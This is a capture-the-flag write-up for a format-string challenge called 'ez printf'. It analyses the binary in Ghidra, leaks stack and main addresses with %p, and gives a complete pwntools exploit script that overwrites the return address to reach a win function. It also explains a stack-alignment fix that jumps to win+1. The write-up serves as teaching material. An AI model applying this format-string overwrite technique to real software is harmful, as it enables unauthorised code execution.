# ez printf
Writeup by: Ethan Andrews

## Description
print the f's

## Writeup
### Initial Looks
Running the program, we are greeted with the message "Haha my buffer cant be overflowed and there is pie, ill even let you read and print twice".

![image](https://github.com/user-attachments/assets/bb832b7d-d2ca-4c3f-b2dc-7b2ac238362e)

Then we are given two user inputs.

### Code Analysis
By analyzing in Ghidra, we can see that it just feeds the user input into printf.

![image](https://github.com/user-attachments/assets/91336488-bff8-4969-9116-725a2f64e729)

This is a clear format string vulnerability.

Additionally, we see a win function that prints the flag.

![image](https://github.com/user-attachments/assets/4a46a94c-b3eb-447b-b13d-08c75f04fe34)

### Format String Vulnerability
We will first send several `%p` to determine what the offsets are.

We can see that a stack address is at the first offset:

![image](https://github.com/user-attachments/assets/0cee851a-638d-4ea4-a11b-112149fb6d3f)

The buffer is at the 6th offset:

![image](https://github.com/user-attachments/assets/c368f84b-3919-45b5-98bc-33f26c05037f)

And the main address is at the 27th offset:

![image](https://github.com/user-attachments/assets/adf461a3-d8e2-46f4-bb55-f8e26d950646)

### Exploit Construction
We will use pwntools for our exploit.

```python3
from pwn import *

exe = context.binary = ELF("./vuln")
p = process("./vuln")
```

We will first receive the address leaks based on the offsets found earlier:

```python
p.recvuntil(b"twice\n")
p.send(b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p")
values = p.recv().split()

buffer_begin = 6 # Offset of the buffer
main_address = int(values[-1].decode(), 16)
stack_address = int(values[0].decode(), 16)
```

The leaked main address is the direct main address, this means we can set the address of the context.

```python3
exe.address = main_address - exe.symbols['main']
```

Using gdb we can see that the leaked stack address appears to be `0x88` away from the return address.

```python3
return_address = stack_address + 0x88
```

Now we can construct the format string payload using pwntools' built in function
```python3
payload = fmtstr_payload(buffer_begin, writes={return_address: (exe.symbols['win'])}, write_size='short') + b"\n"
p.send(payload)

p.interactive()
```

When executing this payload, we can see that it succesfully enters the win function, but doesn't actually print out
the flag and segfaults.

![image](https://github.com/user-attachments/assets/3170fb6a-2eb3-4bb2-aa47-01c494f662de)

### GDB Analysis
To figure out what's going on, we can use gdb to see the exact instruction it segfaults.

![image](https://github.com/user-attachments/assets/857d23e5-8825-478f-afcc-d2287a3aaebd)

It appears that it segfaults on `movaps XMMWORD PTR [rsp+0x50], xmm0`. After doing some research,
we find that this instruction requires that the stack pointer be 16 byte aligned. However, we can see that
the `RSP` value is not 16 byte aligned.

![image](https://github.com/user-attachments/assets/f92970f6-7c44-42e1-ac43-03be5bc9b78d)

We can see that when we jump to the win function, it performs a `push rbp` function that causes the misalignment.
We can simply skip to the next instruction to bypass this and maintain alignment.

![image](https://github.com/user-attachments/assets/5682502b-e137-4bba-950b-c71523c3b67e)

The next instruction is one byte away, so we will simply add 1 to the win function.

```python3
payload = fmtstr_payload(buffer_begin, writes={return_address: (exe.symbols['win'] + 1)}, write_size='short') + b"\n"
```

This gives us the final working exploit:

```python3
from pwn import *

exe = context.binary = ELF("./vuln")
p = process("./vuln")

p.recvuntil(b"twice\n")
p.send(b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p")
values = p.recv().split()

buffer_begin = 6 # Offset of the buffer
main_address = int(values[-1].decode(), 16)
stack_address = int(values[0].decode(), 16)

exe.address = main_address - exe.symbols['main']
return_address = stack_address + 0x88

payload = fmtstr_payload(buffer_begin, writes={return_address: (exe.symbols['win'] + 1)}, write_size='short') + b"\n"
p.send(payload)

p.interactive()
```

Running this will print the flag.

## Important Concepts
- Format String vulnerabilities


